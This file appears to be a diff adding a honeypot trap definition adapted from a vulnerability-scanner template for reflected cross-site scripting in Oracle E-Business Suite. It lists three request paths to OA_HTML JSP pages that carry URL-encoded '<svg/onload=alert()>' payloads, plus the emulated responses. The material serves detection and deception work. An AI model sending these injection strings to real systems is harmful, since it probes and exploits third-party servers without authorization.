@@ -1,0 +1,40 @@
+id: oracle-ebs-xss
+info:
+  name: Oracle E-Business Suite - Cross-Site Scripting
+  author: dhiyaneshDk
+  description: Oracle E-Business Suite is vulnerable to Cross Site Scripting.
+  severity: medium
+  reference:
+  - https://www.blackhat.com/docs/us-16/materials/us-16-Litchfield-Hackproofing-Oracle-eBusiness-Suite.pdf
+  - http://www.davidlitchfield.com/AssessingOraclee-BusinessSuite11i.pdf
+  metadata:
+    max-request: 3
+  tags: oracle,xss,ebs,intrusive
+traps:
+- request:
+    method: GET
+    path: /OA_HTML/jtfLOVInProcess.jsp%3FAAA%3DAAAAAAAAAA%27%22%3E%3Csvg%2Fonload%3Dalert('')%3E
+    headers: null
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: <svg/onload=alert('{{randstr}}')>
+- request:
+    method: GET
+    path: /OA_HTML/oksAutoRenewalHelp.jsp%3Fthanks%3D%27%22%3E%3Csvg%2Fonload%3Dalert('')%3E
+    headers: null
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: ''
+- request:
+    method: GET
+    path: /OA_HTML/ieuiMeetingErrorDisplay.jsp%3FErrCode%3D%27%22%3E%3Csvg%2Fonload%3Dalert('')%3E
+    headers: null
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: ''
